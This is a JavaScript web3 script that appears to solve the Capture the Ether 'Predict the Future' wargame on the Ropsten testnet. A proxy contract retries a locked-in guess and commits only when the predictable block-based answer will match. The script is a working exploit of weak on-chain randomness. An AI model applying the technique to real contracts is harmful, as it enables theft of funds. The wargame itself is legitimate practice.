/**
 * INSTRUCTIONS
 *
 * 1. Deploy ProxyContract by running `truffle migrate --network ropsten`
 * 2. Copy ProxyContract address to variable below
 * 3. Copy PredictTheFuture address (from capturetheether) to variable below
 * 4. All good, run it.
 *
 * SOLUTION
 *
 * ProxyContract will only "settle" the answer once we're sure the answer will be right.
 *
 * ISSUES
 * 1. estimateGas didn't seem to work, replaced it by `web3.eth.getGasPrice`
 * 2. Because `lockInGuess` and a very low gasPrice I had to send another
 * transaction with the same `nonce` (pass `nonce` as parameter).
 */

const HDWalletProvider = require("@truffle/hdwallet-provider");
const Web3 = require("web3");
const Web3Utils = require("web3-utils");
const fs = require("fs");

const mnemonic = fs.readFileSync("../.secret").toString().trim();
const infuraProjectId = fs.readFileSync("../.infura").toString().trim();

const provider = new HDWalletProvider({
  mnemonic: {
    phrase: mnemonic,
  },
  providerOrUrl: `https://ropsten.infura.io/v3/${infuraProjectId}`,
});

const web3 = new Web3(provider);

const proxyAbi = JSON.parse(
  fs.readFileSync("./5_predict_the_future_ropsten/build/contracts/ProxyContract.json")
).abi;

// replace contract addresses accordingly after running `truffle migrate --reset`
const predictContractAddress = "0x7bCd1F49De3AF38fD5E6615Ac0ebEeB368DA90A2";
const proxyContractAddress = "0xb671E79d871D1E25154f09B87508Cf2cd18B4B51";

const outputBalances = (userAccount) => {
  web3.eth.getBalance(userAccount, (_, balance) => {
    console.log("Account balance: " + Web3Utils.fromWei(balance, "ether"));
  });
  web3.eth.getBalance(predictContractAddress, (_, balance) => {
    console.log(
      "PredictContract balance: " + Web3Utils.fromWei(balance, "ether")
    );
  });
  web3.eth.getBalance(proxyContractAddress, (_, balance) => {
    console.log(
      "ProxyContract balance: " + Web3Utils.fromWei(balance, "ether")
    );
  });
};

const tentativeInterval = 13500;
const guess = 9;

const delay = ms => new Promise(resolve => setTimeout(resolve, ms))

const runTentative = async (account, gasPrice, proxyContract) => {
  /**
   * If we're very lucky the algorithm can actually pass by only running once.
   * But it's likely we'll need a few more tentatives (no ether will be consumed only gas).
   */
  console.log("New block hash: " + (await web3.eth.getBlock('latest')).number);

  try {
    const nestedRes = await proxyContract.methods
      .tryWin(predictContractAddress)
      .send({ from: account, gasPrice });

    console.log(nestedRes);

    // return ether expenses to original account
    await proxyContract.methods
      .destroy()
      .send({ from: account, gasPrice });

    outputBalances(account);
    return true;
  }
  catch (err) {
    console.warn(err.message);
    return false;
  }
}

async function main() {
  try {
    const accounts = await web3.eth.getAccounts();
    const amountToSend = Web3Utils.toWei("1", "ether");
    let keepTrying = true;

    outputBalances(accounts[0]);

    const proxyContract = new web3.eth.Contract(proxyAbi, proxyContractAddress);

    const gasPrice = await web3.eth.getGasPrice();
    console.log('Gas price:' + gasPrice);

    const res = await proxyContract.methods
      .lockInGuess(guess, predictContractAddress)
      .send({ from: accounts[0], value: amountToSend, gasPrice, /*nonce: 37*/ });

    console.log(res);

    // advance the block by two otherwise require in Predict contract will not pass
    console.log("Block hash: " + (await web3.eth.getBlock('latest')).number);

    while (keepTrying) {
      const isGuessMatchingAnswer = await runTentative(accounts[0], gasPrice, proxyContract);
      if (isGuessMatchingAnswer) {
        keepTrying = false;
      }
      else {
        // TODO ideally we should only wait for the difference between the time already
        // spent waiting for network calls and the tentativeInterval
        await delay(tentativeInterval);
      }
    }

  } catch (ex) {
    console.warn(ex);
  } finally {
    provider.engine.stop();
  }
}

main();
